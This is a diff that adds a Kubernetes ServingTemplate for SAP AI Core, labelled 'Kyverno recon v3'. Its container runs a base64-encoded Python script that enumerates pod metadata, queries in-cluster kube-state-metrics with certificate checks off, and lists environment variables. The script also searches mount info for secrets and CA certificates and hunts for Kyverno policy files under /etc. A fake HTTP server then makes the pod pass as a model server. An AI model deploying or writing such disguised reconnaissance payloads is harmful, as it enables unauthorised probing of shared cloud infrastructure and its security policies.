@@ -1,0 +1,62 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: kyv-recon-v3
+  labels:
+    scenarios.ai.sap.com/id: "kyv-recon-v3-scenario"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "kyv-recon-v3-scenario"
+    executables.ai.sap.com/name: "kyv-recon-v3"
+    executables.ai.sap.com/description: "Kyverno recon v3 with downward API"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh","-c"]
+          args:
+          - |
+            printf '%s' 'aW1wb3J0IG9zLCBzeXMsIGpzb24sIHNzbCwgdXJsbGliLnJlcXVlc3QsIHVybGxpYi5lcnJvcgoKZGVmIHIoaywgdik6CiAgICBwcmludChmIltLOFJFQ09OM10ge2t9OiB7c3RyKHYpWzo4MDAwXX0iLCBmbHVzaD1UcnVlKQoKIyAtLS0tLS0tLS0tIDEuIFJlYWQgcG9kIG1ldGFkYXRhIHZpYSBkb3dud2FyZCBBUEkgdm9sdW1lIC0tLS0tLS0tLS0KZm9yIGYgaW4gKCIvZXRjL3BvZGluZm8vYW5ub3RhdGlvbnMiLCAiL2V0Yy9wb2RpbmZvL2xhYmVscyIsICIvZXRjL3BvZGluZm8vbmFtZSIsICIvZXRjL3BvZGluZm8vbmFtZXNwYWNlIik6CiAgICB0cnk6CiAgICAgICAgYyA9IG9wZW4oZikucmVhZCgpCiAgICAgICAgcihmIkRPV05XQVJEX3tmfSIsIGNbOjQwMDBdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHIoZiJET1dOV0FSRF97Zn1fRVJSIiwgc3RyKGUpKQoKIyAtLS0tLS0tLS0tIDIuIExpc3QgZG93bndhcmQgQVBJIGRpciBpZiBleGlzdHMgLS0tLS0tLS0tLQpmb3IgZCBpbiAoIi9ldGMvcG9kaW5mbyIsICIvZXRjL3BvZGxhYmVscyIsICIvZXRjL3BvZGFubm90YXRpb25zIik6CiAgICB0cnk6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZCk6CiAgICAgICAgICAgIHIoZiJESVJMSVNUX3tkfSIsIHN0cihvcy5saXN0ZGlyKGQpKSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByKGYiRElSTElTVF97ZH1fRVJSIiwgc3RyKGUpKQoKIyAtLS0tLS0tLS0tIDMuIFNjcmFwZSBLU00gZm9yIG91ciBzcGVjaWZpYyBwb2QgKHZpYSBsYWJlbHMpIC0tLS0tLS0tLS0KdHJ5OgogICAgbWUgPSBvcy51bmFtZSgpLm5vZGVuYW1lICAjIHBvZCBuYW1lCiAgICBib2R5LCBjb2RlLCBfID0gKE5vbmUsIDAsIE5vbmUpCiAgICB0cnk6CiAgICAgICAgcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdCgiaHR0cDovL2tzbS1tdWx0aS1rdWJlLXN0YXRlLW1ldHJpY3Mub3BlbnRlbGVtZXRyeS5zdmMuY2x1c3Rlci5sb2NhbDo4MDgwL21ldHJpY3MiKQogICAgICAgIGN0eCA9IHNzbC5jcmVhdGVfZGVmYXVsdF9jb250ZXh0KCk7IGN0eC5jaGVja19ob3N0bmFtZT1GYWxzZTsgY3R4LnZlcmlmeV9tb2RlPXNzbC5DRVJUX05PTkUKICAgICAgICByZXNwID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsIHRpbWVvdXQ9MzAsIGNvbnRleHQ9Y3R4KQogICAgICAgIGJvZHksIGNvZGUgPSByZXNwLnJlYWQoKSwgcmVzcC5zdGF0dXMKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByKCJLU01fRkVUQ0hfRVJSIiwgc3RyKGUpKQogICAgaWYgY29kZSA9PSAyMDA6CiAgICAgICAgdGV4dCA9IGJvZHkuZGVjb2RlKGVycm9ycz0icmVwbGFjZSIpCiAgICAgICAgbXlfbGluZXMgPSBbbCBmb3IgbCBpbiB0ZXh0LnNwbGl0KCJcbiIpIGlmIG1lWzozMF0gaW4gbF0KICAgICAgICByKCJLU01fTVlfUE9EX0xJTkVTX0NPVU5UIiwgc3RyKGxlbihteV9saW5lcykpKQogICAgICAgIGZvciBpLCBsIGluIGVudW1lcmF0ZShteV9saW5lc1s6MzBdKToKICAgICAgICAgICAgcihmIktTTV9NWV9QT0Rfe2l9IiwgbFs6NjAwXSkKICAgICAgICAjIEFsc28gZHVtcCBrdWJlX3BvZF9pbmZvIGZvciBvdXIgbmFtZXNwYWNlCiAgICAgICAgbnNfbGluZXMgPSBbbCBmb3IgbCBpbiB0ZXh0LnNwbGl0KCJcbiIpIGlmIGwuc3RhcnRzd2l0aCgia3ViZV9wb2RfaW5mb3siKSBhbmQgInByZWRpY3RvciIgaW4gbF0KICAgICAgICByKCJLU01fUFJFRF9QT0RTIiwgc3RyKGxlbihuc19saW5lcykpKQogICAgICAgIGZvciBpLCBsIGluIGVudW1lcmF0ZShuc19saW5lc1s6MTBdKToKICAgICAgICAgICAgcihmIktTTV9QUkVEX3tpfSIsIGxbOjYwMF0pCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHIoIktTTV9QUk9DX0VSUiIsIHN0cihlKSkKCiMgLS0tLS0tLS0tLSA0LiBQcmludCBmdWxsIGVudiAoZmlsdGVyZWQgZm9yIEs4cy9LLW5hdGl2ZS9LeXZlcm5vIGhpbnRzKSAtLS0tLS0tLS0tCmhpbnRzID0ge2s6diBmb3Igayx2IGluIG9zLmVudmlyb24uaXRlbXMoKX0KcigiRU5WX0ZVTEwiLCBqc29uLmR1bXBzKHNvcnRlZChoaW50cy5rZXlzKCkpKVs6MjAwMF0pCgojIC0tLS0tLS0tLS0gNS4gL3Byb2Mvc2VsZi9tb3VudGluZm8gLSBsb29rIGZvciBwcm9qZWN0ZWQgY29uZmlnTWFwcyB0aGF0IG1pZ2h0IGxlYWsgcG9saWN5IGluZm8gLS0tLS0tLS0tLQp0cnk6CiAgICBtaSA9IG9wZW4oIi9wcm9jL3NlbGYvbW91bnRpbmZvIikucmVhZCgpCiAgICByKCJNT1VOVElORk9fTEVOIiwgc3RyKGxlbihtaSkpKQogICAgaW50ZXJlc3RpbmcgPSBbbCBmb3IgbCBpbiBtaS5zcGxpdCgiXG4iKSBpZiBhbnkoa3cgaW4gbCBmb3Iga3cgaW4gKCJwb2RpbmZvIiwiZG93bndhcmQiLCJreXZlcm5vIiwicG9saWN5IiwiY2EtY2VydCIsImt1YmUtYXBpIiwic2VjcmV0cyIpKV0KICAgIGZvciBsIGluIGludGVyZXN0aW5nWzozMF06CiAgICAgICAgcigiTU9VTlQiLCBsWzo0MDBdKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICByKCJNT1VOVElORk9fRVJSIiwgc3RyKGUpKQoKIyAtLS0tLS0tLS0tIDYuIFNuaWZmIGZvciBhbnkgcHJvamVjdGVkIGNvbmZpZ21hcHMgbW91bnRlZCAtLS0tLS0tLS0tCnRyeToKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKCIvZXRjIik6CiAgICAgICAgZm9yIGYgaW4gZmlsZXM6CiAgICAgICAgICAgIHAgPSBvcy5wYXRoLmpvaW4ocm9vdCwgZikKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5nZXRzaXplKHApIDwgNTAwMDA6CiAgICAgICAgICAgICAgICAgICAgcyA9IG9wZW4ocCkucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgaWYgImt5dmVybm8iIGluIHMubG93ZXIoKSBvciAicG9saWNpZXMua3l2ZXJuby5pbyIgaW4gcy5sb3dlcigpOgogICAgICAgICAgICAgICAgICAgICAgICByKGYiRk9VTkRfS1lWX0ZJTEUiLCBwKQogICAgICAgICAgICAgICAgICAgICAgICByKGYiRklMRV9IRUFEX3twfSIsIHNbOjIwMDBdKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcigiRlNXQUxLX0VSUiIsIHN0cihlKSkKCnByaW50KCJbSzhSRUNPTjNdIERPTkUiLCBmbHVzaD1UcnVlKQo=' | base64 -d > /tmp/p.py
+            python3 /tmp/p.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+              def log_message(self,*a): pass
+            http.server.HTTPServer(('',8080),H).serve_forever()
+            "
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          volumeMounts:
+          - name: podinfo
+            mountPath: /etc/podinfo
+            readOnly: true
+        volumes:
+        - name: podinfo
+          downwardAPI:
+            items:
+            - path: "annotations"
+              fieldRef:
+                fieldPath: metadata.annotations
+            - path: "labels"
+              fieldRef:
+                fieldPath: metadata.labels
+            - path: "name"
+              fieldRef:
+                fieldPath: metadata.name
+            - path: "namespace"
+              fieldRef:
+                fieldPath: metadata.namespace
